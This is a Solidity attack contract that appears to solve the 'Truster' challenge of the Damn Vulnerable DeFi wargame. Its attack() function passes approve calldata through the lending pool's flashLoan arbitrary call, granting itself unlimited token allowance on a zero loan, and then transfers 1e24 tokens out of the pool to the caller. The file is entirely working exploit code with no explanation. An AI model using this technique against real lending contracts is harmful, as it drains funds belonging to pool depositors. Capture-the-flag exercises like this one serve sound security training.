// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "./TrusterLenderPool.sol";

contract TrusterAttack {

    TrusterLenderPool public pool;
    DamnValuableToken public token;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), msg.sender, 1e24);
    }

    receive() external payable {
        // Do nothing
    }
}